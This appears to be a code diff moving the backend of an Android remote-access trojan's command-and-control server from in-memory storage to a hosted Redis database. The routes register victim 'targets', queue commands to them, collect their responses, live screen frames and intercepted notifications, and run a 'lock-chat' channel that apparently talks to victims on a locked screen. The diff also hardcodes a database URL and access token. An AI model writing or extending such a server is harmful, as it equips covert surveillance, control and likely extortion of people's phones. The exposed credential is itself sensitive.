@@ -1,5 +1,6 @@
 const express = require("express");
 const crypto = require("crypto");
+const { Redis } = require("@upstash/redis");
 
 const app = express();
 app.use(express.json({ limit: "10mb" }));
@@ -13,15 +14,10 @@ app.use((req, res, next) => {
   next();
 });
 
-const store = {
-  targets: [],
-  commands: [],
-  responses: [],
-  notifications: [],
-  liveFrames: {},
-  lockChats: {},
-  pairs: {},
-};
+const redis = new Redis({
+  url: "https://exact-hen-210622.upstash.io",
+  token: "gQAAAAAAAza-AAIgcDJiMWJjOGRlM2Q1MGM0YjEwYWI3MWM2OGUyMjBiNmVmMw",
+});
 
 function genPairId() {
   return crypto.randomBytes(8).toString("hex").toUpperCase();
@@ -29,223 +25,297 @@ function genPairId() {
 
 app.get("/ping", (_req, res) => res.send("pong"));
 
-app.post("/api/claim-pair", (req, res) => {
-  const pairId = genPairId();
-  store.pairs[pairId] = { id: pairId, createdAt: Date.now() };
-  res.json({ valid: true, pairId });
-});
-
-app.get("/rat/pairid", (req, res) => {
-  const existing = Object.keys(store.pairs);
-  if (existing.length > 0) {
-    return res.json({ valid: true, pairId: existing[0] });
+app.post("/api/claim-pair", async (req, res) => {
+  try {
+    const pairId = genPairId();
+    await redis.set(`pair:${pairId}`, { id: pairId, createdAt: Date.now() });
+    res.json({ valid: true, pairId });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
   }
-  const pairId = genPairId();
-  store.pairs[pairId] = { id: pairId, createdAt: Date.now() };
-  res.json({ valid: true, pairId });
 });
 
-app.post("/api/pair-target", (req, res) => {
-  const { pairId, deviceId, model, battery } = req.body;
-  if (!pairId || !deviceId)
-    return res.status(400).json({ error: "pairId and deviceId required" });
+app.get("/rat/pairid", async (req, res) => {
+  try {
+    const keys = await redis.keys("pair:*");
+    if (keys.length > 0) {
+      const pairId = keys[0].replace("pair:", "");
+      return res.json({ valid: true, pairId });
+    }
+    const pairId = genPairId();
+    await redis.set(`pair:${pairId}`, { id: pairId, createdAt: Date.now() });
+    res.json({ valid: true, pairId });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
 
-  if (!store.pairs[pairId.toUpperCase()])
-    return res.status(404).json({ error: "invalid pairId" });
+app.post("/api/pair-target", async (req, res) => {
+  try {
+    const { pairId, deviceId, model, battery } = req.body;
+    if (!pairId || !deviceId)
+      return res.status(400).json({ error: "pairId and deviceId required" });
 
-  let t = store.targets.find((x) => x.id === deviceId);
-  if (t) {
-    t.pairId = pairId;
-    t.model = model || t.model;
-    t.battery = battery || t.battery;
-    t.status = "Online";
-    t.lastSeen = new Date().toISOString();
-  } else {
-    store.targets.push({
+    const validPair = await redis.get(`pair:${pairId.toUpperCase()}`);
+    if (!validPair) return res.status(404).json({ error: "invalid pairId" });
+
+    const target = {
       id: deviceId,
       model: model || "Unknown",
       battery: battery || "?",
       pairId,
       status: "Online",
       lastSeen: new Date().toISOString(),
+    };
+    await redis.set(`target:${deviceId}`, target);
+    res.json({ status: "paired" });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.post("/api/register-target", async (req, res) => {
+  try {
+    const d = req.body;
+    if (!d.id) return res.status(400).json({ error: "id required" });
+    d.lastSeen = new Date().toISOString();
+    await redis.set(`target:${d.id}`, d);
+    res.json({ status: "ok" });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.post("/api/heartbeat/:id", async (req, res) => {
+  try {
+    const id = req.params.id;
+    const t = await redis.get(`target:${id}`);
+    if (t) {
+      t.lastSeen = new Date().toISOString();
+      t.status = "Online";
+      if (req.body.battery) t.battery = req.body.battery;
+      await redis.set(`target:${id}`, t);
+    }
+    res.status(200).send("1");
+  } catch (e) {
+    res.status(500).send("0");
+  }
+});
+
+app.get("/api/list-targets", async (req, res) => {
+  try {
+    const keys = await redis.keys("target:*");
+    const targets = [];
+    for (const k of keys) {
+      targets.push(await redis.get(k));
+    }
+    res.json(targets);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.get("/rat/my-devices", async (req, res) => {
+  try {
+    const now = Date.now();
+    const keys = await redis.keys("target:*");
+    const devices = [];
+    for (const k of keys) {
+      const t = await redis.get(k);
+      if (!t) continue;
+      const seen = Date.parse(t.lastSeen || 0) || 0;
+      const on = now - seen < 30000;
+      devices.push({
+        id: t.id,
+        model: t.model || "Unknown",
+        battery: t.battery || "?",
+        online: on,
+        lastSeen: t.lastSeen,
+      });
+    }
+    
+    const pairKeys = await redis.keys("pair:*");
+    const pairId = pairKeys.length > 0 ? pairKeys[0].replace("pair:", "") : null;
+
+    res.json({
+      valid: true,
+      pairId,
+      devices,
+      myDevicesCount: devices.length,
+      totalDevices: devices.length,
     });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
   }
-
-  res.json({ status: "paired" });
-});
-
-app.post("/api/register-target", (req, res) => {
-  const d = req.body;
-  if (!d.id) return res.status(400).json({ error: "id required" });
-
-  let t = store.targets.find((x) => x.id === d.id);
-  if (t) Object.assign(t, d, { lastSeen: new Date().toISOString() });
-  else store.targets.push({ ...d, lastSeen: new Date().toISOString() });
-
-  res.json({ status: "ok" });
-});
-
-app.post("/api/heartbeat/:id", (req, res) => {
-  const t = store.targets.find((x) => x.id === req.params.id);
-  if (t) {
-    t.lastSeen = new Date().toISOString();
-    t.status = "Online";
-    if (req.body.battery) t.battery = req.body.battery;
-  }
-  res.status(200).send("1");
-});
-
-app.get("/api/list-targets", (req, res) => {
-  res.json(store.targets);
-});
-
-app.get("/rat/my-devices", (req, res) => {
-  const now = Date.now();
-  for (const t of store.targets) {
-    const seen = Date.parse(t.lastSeen || 0) || 0;
-    if (now - seen > 30000) t.status = "Offline";
-  }
-
-  const devices = store.targets.map((t) => ({
-    id: t.id,
-    model: t.model || "Unknown",
-    battery: t.battery || "?",
-    online: t.status === "Online",
-    lastSeen: t.lastSeen,
-  }));
-
-  res.json({
-    valid: true,
-    pairId: Object.keys(store.pairs)[0] || null,
-    devices,
-    myDevicesCount: devices.length,
-    totalDevices: devices.length,
-  });
 });
 
 app.get("/rat/permission-status", (_req, res) => {
   res.json({ valid: true });
 });
 
-app.post("/api/send-command", (req, res) => {
-  const { id, command, extra } = req.body;
-  if (!id || !command)
-    return res.status(400).json({ error: "id + command required" });
+app.post("/api/send-command", async (req, res) => {
+  try {
+    const { id, command, extra } = req.body;
+    if (!id || !command)
+      return res.status(400).json({ error: "id + command required" });
 
-  store.commands = store.commands.filter((c) => c.targetId !== id);
-  store.commands.push({
-    targetId: id,
-    command,
-    extra: extra || "",
-    timestamp: new Date().toISOString(),
-  });
-
-  res.json({ status: "queued" });
+    const cmd = {
+      targetId: id,
+      command,
+      extra: extra || "",
+      timestamp: new Date().toISOString(),
+    };
+    await redis.set(`cmd:${id}`, cmd);
+    res.json({ status: "queued" });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-app.get("/api/get-command/:id", (req, res) => {
-  const i = store.commands.findIndex((c) => c.targetId === req.params.id);
-  if (i === -1) return res.status(204).send();
-
-  const cmd = store.commands[i];
-  store.commands.splice(i, 1);
-  res.json(cmd);
+app.get("/api/get-command/:id", async (req, res) => {
+  try {
+    const cmd = await redis.get(`cmd:${req.params.id}`);
+    if (!cmd) return res.status(204).send();
+    await redis.del(`cmd:${req.params.id}`);
+    res.json(cmd);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-app.post("/api/post-response/:id", (req, res) => {
-  const { cmd, data } = req.body;
-  const i = store.responses.findIndex((r) => r.targetId === req.params.id);
-
-  const nr = {
-    targetId: req.params.id,
-    cmd,
-    data,
-    timestamp: new Date().toISOString(),
-  };
-
-  if (i !== -1) store.responses[i] = nr;
-  else store.responses.push(nr);
-
-  res.json({ status: "ok" });
+app.post("/api/post-response/:id", async (req, res) => {
+  try {
+    const { cmd, data } = req.body;
+    const nr = {
+      targetId: req.params.id,
+      cmd,
+      data,
+      timestamp: new Date().toISOString(),
+    };
+    await redis.set(`resp:${req.params.id}`, nr);
+    res.json({ status: "ok" });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-app.get("/api/get-response/:id", (req, res) => {
-  res.json(store.responses.find((r) => r.targetId === req.params.id) || {});
+app.get("/api/get-response/:id", async (req, res) => {
+  try {
+    const r = await redis.get(`resp:${req.params.id}`);
+    res.json(r || {});
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-app.post("/api/live-frame/:id", (req, res) => {
-  const { frame, ts } = req.body;
-  if (!frame) return res.status(400).json({ error: "no frame" });
-
-  store.liveFrames[req.params.id] = { frame, ts: ts || Date.now() };
-  res.json({ status: "ok" });
+app.post("/api/live-frame/:id", async (req, res) => {
+  try {
+    const { frame, ts } = req.body;
+    if (!frame) return res.status(400).json({ error: "no frame" });
+    await redis.set(`frame:${req.params.id}`, { frame, ts: ts || Date.now() });
+    res.json({ status: "ok" });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-app.get("/api/live-frame/:id", (req, res) => {
-  const d = store.liveFrames[req.params.id];
-  if (!d) return res.status(404).json({ error: "no frame yet" });
-  res.json(d);
+app.get("/api/live-frame/:id", async (req, res) => {
+  try {
+    const d = await redis.get(`frame:${req.params.id}`);
+    if (!d) return res.status(404).json({ error: "no frame yet" });
+    res.json(d);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-app.post("/api/post-notification/:id", (req, res) => {
-  store.notifications.unshift({
-    targetId: req.params.id,
-    ...req.body,
-    timestamp: new Date().toISOString(),
-  });
-
-  if (store.notifications.length > 1000) store.notifications.length = 1000;
-
-  res.json({ status: "saved" });
+app.post("/api/post-notification/:id", async (req, res) => {
+  try {
+    const id = req.params.id;
+    const notif = {
+      targetId: id,
+      ...req.body,
+      timestamp: new Date().toISOString(),
+    };
+    await redis.lpush(`notifs:${id}`, notif);
+    await redis.ltrim(`notifs:${id}`, 0, 99);
+    res.json({ status: "saved" });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-app.get("/api/get-notifications/:id", (req, res) => {
-  res.json(store.notifications.filter((n) => n.targetId === req.params.id));
+app.get("/api/get-notifications/:id", async (req, res) => {
+  try {
+    const notifs = await redis.lrange(`notifs:${req.params.id}`, 0, -1);
+    res.json(notifs);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-app.get("/api/lock-chat/:id", (req, res) => {
-  res.json({ messages: store.lockChats[req.params.id] || [] });
+app.get("/api/lock-chat/:id", async (req, res) => {
+  try {
+    const msgs = await redis.lrange(`chat:${req.params.id}`, 0, -1);
+    res.json({ messages: msgs });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-app.post("/api/lock-chat/:id", (req, res) => {
-  const id = req.params.id;
-  const { from, text, msg } = req.body;
-
-  if (!store.lockChats[id]) store.lockChats[id] = [];
-
-  store.lockChats[id].push({
-    from: from || "owner",
-    text: text || msg || "",
-    time: new Date().toISOString(),
-  });
-
-  if (store.lockChats[id].length > 100)
-    store.lockChats[id] = store.lockChats[id].slice(-100);
-
-  res.json({ status: "ok" });
+app.post("/api/lock-chat/:id", async (req, res) => {
+  try {
+    const id = req.params.id;
+    const { from, text, msg } = req.body;
+    const chat = {
+      from: from || "owner",
+      text: text || msg || "",
+      time: new Date().toISOString(),
+    };
+    await redis.rpush(`chat:${id}`, chat);
+    await redis.ltrim(`chat:${id}`, -100, -1);
+    res.json({ status: "ok" });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-app.get("/api/lock-chat-all/:id", (req, res) => {
-  res.json({ messages: store.lockChats[req.params.id] || [] });
+app.get("/api/lock-chat-all/:id", async (req, res) => {
+  try {
+    const msgs = await redis.lrange(`chat:${req.params.id}`, 0, -1);
+    res.json({ messages: msgs });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-app.delete("/api/lock-chat/:id", (req, res) => {
-  store.lockChats[req.params.id] = [];
-  res.json({ status: "cleared" });
+app.delete("/api/lock-chat/:id", async (req, res) => {
+  try {
+    await redis.del(`chat:${req.params.id}`);
+    res.json({ status: "cleared" });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-app.get("/api/stats", (_req, res) => {
-  const now = Date.now();
-  const online = store.targets.filter((t) => {
-    const seen = Date.parse(t.lastSeen || 0) || 0;
-    return now - seen < 30000;
-  }).length;
-
-  res.json({
-    onlineUsers: online,
-    activeConnections: store.targets.length,
-    totalTargets: store.targets.length,
-  });
+app.get("/api/stats", async (_req, res) => {
+  try {
+    const now = Date.now();
+    const keys = await redis.keys("target:*");
+    let online = 0;
+    for (const k of keys) {
+      const t = await redis.get(k);
+      const seen = Date.parse(t?.lastSeen || 0) || 0;
+      if (now - seen < 30000) online++;
+    }
+    res.json({
+      onlineUsers: online,
+      activeConnections: keys.length,
+      totalTargets: keys.length,
+    });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
 app.get("/", (_req, res) =>
